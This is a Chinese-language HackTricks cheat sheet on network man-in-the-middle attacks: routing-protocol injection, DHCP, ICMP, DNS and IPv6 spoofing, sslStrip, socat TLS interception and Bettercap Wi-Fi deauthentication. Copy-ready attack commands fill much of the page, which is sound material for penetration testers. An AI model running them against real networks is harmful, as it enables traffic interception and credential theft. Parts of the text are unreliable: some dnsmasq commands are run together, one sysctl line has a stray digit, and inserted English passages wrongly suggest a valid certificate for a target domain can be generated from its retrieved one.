**FHRP**（First Hop Redundancy Protocol）是一类用于创建热备份路由系统的网络协议。通过FHRP，物理路由器可以组合成一个单一的逻辑设备，从而增加容错性并帮助分担负载。

**思科系统的工程师开发了两种FHRP协议，即GLBP和HSRP。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

路由信息协议（RIP）有三个版本——RIP、RIPv2和RIPng。RIP和RIPv2使用通过端口520发送到对等方的UDP数据报，而RIPng通过IPv6组播将数据报广播到UDP端口521。RIPv2引入了MD5身份验证支持。RIPng不包含本地身份验证，而是依赖于IPv6中的可选IPsec AH和ESP头。

有关如何攻击此协议的更多信息，请参阅书籍_**Network Security Assessment: Know Your Network (第3版)**_。

### EIGRP攻击

**EIGRP（Enhanced Interior Gateway Routing Protocol）**是一种动态路由协议。**它是一种距离矢量协议。**如果没有身份验证和被动接口的配置，**入侵者**可以干扰EIGRP路由并导致**路由表污染**。此外，EIGRP网络（换句话说，自治系统）**是平坦的，没有分段成任何区域**。如果**攻击者注入一条路由**，很可能这条路由会在自治EIGRP系统中**传播**。

攻击EIGRP系统需要**与合法的EIGRP路由器建立邻居关系**，这打开了许多可能性，从基本的侦察到各种注入。

\*\*\*\*[**FRRouting**](https://frrouting.org/)允许您实现**支持BGP、OSPF、EIGRP、RIP和其他协议的虚拟路由器**。您只需在攻击者的系统上部署它，就可以假装成路由域中的合法路由器。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)还支持捕获EIGRP广播和注入数据包以操纵路由配置。有关如何使用Coly攻击它的更多信息，请参阅_**Network Security Assessment: Know Your Network (第3版)**_。

### OSPF

大多数Open Shortest Path First（OSPF）实现使用MD5提供路由器之间的身份验证。Loki和John the Ripper可以捕获和攻击MD5哈希以揭示密钥，然后可以使用该密钥来广告新路由。可以使用“注入”选项卡设置路由参数，并在“连接”下设置密钥。

有关如何攻击此协议的更多信息，请参阅书籍_**Network Security Assessment: Know Your Network (第3版)**_。

### 其他通用工具和资源

* [**Above**](https://github.com/c4s73r/Above)：用于扫描网络流量并查找漏洞的工具
* 您可以在[此处](https://github.com/Sab0tag3d/MITM-cheatsheet)找到有关网络攻击的更多信息。_（TODO：阅读所有内容和任何新攻击）_

## **欺骗**

攻击者通过发送虚假的DHCP响应来配置新加入网络的所有网络参数（GW、IP、DNS）。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP欺骗

请查看[前一节](./#arp-spoofing)。

### ICMP重定向

ICMP重定向是指发送一个ICMP数据包，类型为1，代码为5，表示攻击者是到达某个IP地址的最佳路径。然后，当受害者想要联系该IP地址时，它会通过攻击者发送数据包。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS欺骗

攻击者将解析受害者请求的一些（或全部）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用dnsmasq配置自己的DNS**

Dnsmasq是一个功能强大的工具，可以用于配置自己的DNS服务器。通过使用Dnsmasq，您可以将特定的域名解析到您选择的IP地址，从而实现更灵活的网络配置。

以下是使用Dnsmasq配置自己的DNS的步骤：

1. **安装Dnsmasq**：首先，您需要安装Dnsmasq软件包。您可以使用适用于您的操作系统的包管理器来安装它。

2. **编辑配置文件**：找到Dnsmasq的配置文件，通常位于`/etc/dnsmasq.conf`。使用文本编辑器打开该文件。

3. **配置DNS解析**：在配置文件中，您可以使用以下语法将特定的域名解析到您选择的IP地址：

   ```
   address=/example.com/192.168.1.100
   ```

   在上面的示例中，将`example.com`解析为`192.168.1.100`。您可以根据需要添加多个解析规则。

4. **保存并关闭文件**：在完成配置后，保存并关闭配置文件。

5. **重启Dnsmasq服务**：使用适用于您的操作系统的命令，重启Dnsmasq服务以使更改生效。

现在，您已成功配置了自己的DNS服务器。当您的系统尝试解析配置的域名时，它将使用您指定的IP地址进行解析。这使您能够更好地控制网络流量和访问。
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

通常存在多个系统和网络的路由。在构建本地网络中的MAC地址列表后，使用 _gateway-finder.py_ 来识别支持IPv4转发的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [欺骗LLMNR、NBT-NS和mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft系统在DNS查找失败时，使用链路本地组播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）进行本地主机解析。Apple Bonjour和Linux零配置实现使用多播DNS（mDNS）来发现网络中的系统。这些协议是未经身份验证的，并通过UDP广播消息；因此，攻击者可以利用它们将用户引导到恶意服务。

您可以使用Responder来发送虚假响应，冒充主机搜索的服务。\
在此处阅读有关[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的更多信息。

### [欺骗WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

许多浏览器使用Web代理自动发现（WPAD）从网络加载代理设置。WPAD服务器通过特定的URL（例如，[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）提供客户端代理设置，当通过以下任一方式识别时：

* DHCP，使用代码252条目[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS，在本地域中搜索_wpad_主机名
* Microsoft LLMNR和NBT-NS（在DNS查找失败的情况下）

Responder自动化了WPAD攻击-运行代理并通过DHCP、DNS、LLMNR和NBT-NS将客户端引导到恶意WPAD服务器。\
在此处阅读有关[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的更多信息。

### [欺骗SSDP和UPnP设备](spoofing-ssdp-and-upnp-devices.md)

您可以在网络中提供不同的服务，试图欺骗用户输入一些明文凭据。**有关此攻击的更多信息，请参阅**[**欺骗SSDP和UPnP设备**](spoofing-ssdp-and-upnp-devices.md)**。**

### IPv6邻居欺骗

这种攻击与ARP欺骗非常相似，但适用于IPv6环境。您可以让受害者认为网关的IPv6具有攻击者的MAC地址。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6路由器广告欺骗/洪水攻击

一些操作系统默认通过网络中发送的RA数据包配置网关。要将攻击者声明为IPv6路由器，您可以使用以下方法：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP欺骗

默认情况下，一些操作系统会尝试通过读取网络中的DHCPv6数据包来配置DNS。因此，攻击者可以发送一个DHCPv6数据包来将自己配置为DNS服务器。DHCP还会为受害者提供一个IPv6地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP（伪造页面和JS代码注入）

## 互联网攻击

### sslStrip

基本上，这种攻击的作用是，当**用户**试图**访问**一个**重定向**到**HTTPS**版本的**HTTP**页面时，**sslStrip**将与**客户端**建立**HTTP连接**并与**服务器**建立**HTTPS连接**，从而能够以**明文**方式**嗅探**连接。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息[在这里](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### 用于绕过HSTS的sslStrip+和dns2proxy

**sslStrip+和dns2proxy**与**sslStrip**的**区别**在于它们会将例如_**www.facebook.com**_ **重定向到**_**wwww.facebook.com**_（注意**额外的**“**w**”），并将**此域的地址设置为攻击者的IP**。这样，**客户端**将**连接到**_**wwww.facebook.com**_（攻击者），但在幕后，**sslstrip+**将通过https与**www.facebook.com**保持**真实连接**。

这种技术的**目标**是**避免HSTS**，因为_**wwww**.facebook.com_ **不会**保存在浏览器的缓存中，所以浏览器会被欺骗以使用HTTP进行**Facebook身份验证**。\
请注意，为了执行此攻击，受害者必须首先尝试访问[http://www.faceook.com](http://www.faceook.com)，而不是https。这可以通过修改http页面中的链接来完成。

更多信息[在这里](https://www.bettercap.org/legacy/#hsts-bypass)，[在这里](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)和[在这里](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStrip或sslStrip+不再起作用。这是因为浏览器中预先保存了HSTS规则，所以即使用户第一次访问一个“重要”域，他也会通过HTTPS访问它。此外，请注意，预先保存的规则和其他生成的规则可以使用标志** [**`includeSubdomains`**](https://hstspreload.appspot.com) **，因此之前的** _**wwww.facebook.com**_ **示例将不再起作用，因为** _**facebook.com**_ **使用带有`includeSubdomains`的HSTS。**

待办事项：easy-creds，evilgrade，metasploit，factory

## 在端口上进行TCP监听
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## 在端口上监听 TCP + SSL

#### 生成密钥和自签名证书

```bash
openssl genrsa -out private.key 2048
openssl req -new -x509 -sha256 -key private.key -out certificate.crt -days 365
```

#### 启动监听器

```bash
openssl s_server -key private.key -cert certificate.crt -accept <port>
```

#### 使用证书验证连接

```bash
openssl s_client -connect <host>:<port> -CAfile certificate.crt
```

#### 使用 nc 连接到监听器

```bash
nc -v <host> <port>
```

#### 使用 curl 连接到监听器

```bash
curl --cacert certificate.crt https://<host>:<port>
```
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书进行监听

To perform a man-in-the-middle attack and intercept network traffic, you can use a valid SSL/TLS certificate. By generating a certificate that matches the target domain, you can establish a secure connection with the client and then forward the traffic to the actual server. This allows you to eavesdrop on the communication without raising suspicion.

Here are the steps to listen using a certificate:

1. Obtain the target domain's SSL/TLS certificate: You can use tools like `openssl` or online services to retrieve the certificate.

2. Generate a certificate: Using the obtained certificate, generate a new certificate that matches the target domain. This can be done using tools like `openssl` or libraries like `pyOpenSSL`.

3. Set up a proxy: Configure a proxy server, such as Burp Suite or mitmproxy, to intercept the traffic between the client and the server.

4. Install the generated certificate: Import the generated certificate into the client's trust store. This will allow the client to establish a secure connection with the proxy server.

5. Forward traffic: Once the client establishes a connection with the proxy server, forward the traffic to the actual server. This can be done automatically by the proxy server.

By using a valid SSL/TLS certificate, you can effectively listen to network traffic without raising suspicion. However, it is important to note that this technique should only be used for ethical purposes, such as penetration testing or network security assessments.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书进行监听并重定向到主机

To listen using a certificate and redirect to the hosts, you can follow these steps:

1. Generate a self-signed certificate or obtain a valid certificate from a trusted Certificate Authority (CA).

2. Configure the web server to use the certificate for SSL/TLS encryption.

3. Set up the appropriate DNS records to redirect the desired hosts to your listening server's IP address.

4. Modify the hosts file on your local machine or the target machine to redirect the desired hosts to your listening server's IP address.

5. Start the listening server and ensure that it is properly configured to handle incoming SSL/TLS connections.

6. When a client connects to one of the redirected hosts, the SSL/TLS handshake will occur using the certificate. The client will establish a secure connection with your listening server.

7. You can then intercept and analyze the traffic between the client and the redirected host.

By using a certificate to listen and redirect traffic, you can effectively perform man-in-the-middle attacks and gain access to sensitive information exchanged between the client and the redirected host.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
有时，如果客户端检查CA是否有效，你可以**提供由CA签名的其他主机名的证书**。\
另一个有趣的测试是提供**请求的主机名的自签名证书**。

其他要测试的内容包括尝试使用有效证书签名，但该证书不是有效的CA。或者使用有效的公钥，强制使用诸如Diffie-Hellman之类的算法（不需要使用真实私钥解密任何内容），当客户端请求真实私钥的探测（如哈希）时，发送一个伪造的探测，并期望客户端不会检查这一点。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 主动发现笔记

请注意，当向一个没有请求的端口发送UDP数据包时，会发送一个ICMP（端口不可达）。

### **ARP发现**

ARP数据包用于发现网络中正在使用的IP地址。PC必须对每个可能的IP地址发送请求，只有正在使用的IP地址才会响应。

### **mDNS（多播DNS）**

Bettercap发送一个MDNS请求（每X毫秒一次），请求的内容是 **\_services\_.dns-sd.\_udp.local**，能看到这个数据包的机器通常会回应这个请求。然后，它只搜索回应“services”的机器。

**工具**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios名称服务器）**

Bettercap广播数据包到端口137/UDP，请求名称为“CKAAAAAAAAAAAAAAAAAAAAAAAAAAA”。

### **SSDP（简单服务发现协议）**

Bettercap广播SSDP数据包，搜索各种服务（UDP端口1900）。

### **WSD（Web服务发现）**

Bettercap广播WSD数据包，搜索服务（UDP端口3702）。

## 参考资料

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug赏金提示**：**注册**Intigriti，一个由黑客创建的高级**Bug赏金平台**！立即加入我们的[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
